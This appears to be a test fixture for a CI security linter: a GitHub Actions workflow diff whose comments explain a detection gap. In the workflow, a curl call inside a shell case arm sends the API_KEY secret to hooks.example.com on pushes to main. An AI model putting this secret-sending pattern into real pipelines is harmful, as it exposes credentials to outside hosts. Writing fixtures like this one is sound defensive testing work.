@@ -1,0 +1,19 @@
+# situation: on push, a step sends the secret API_KEY to hooks.example.com
+#   with curl, in an arm of case.
+# reason: a todo (the same file): the request carries the key to the host.
+# cause: the rule does not walk the commands of an arm of case.
+# attack: the attacker takes over the server of the destination, by a breach
+#   of the vendor or by registering the domain when the domain lapses.
+# attack-run-behavior: on a push to main, curl sends the key to
+#   hooks.example.com, whose server, now the attacker's, logs the key.
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          API_KEY: ${{ secrets.API_KEY }}
+        run: |
+          case "$GITHUB_REF_NAME" in
+            main) curl -fsS -H "x-apikey: $API_KEY" https://hooks.example.com/ ;;
+          esac
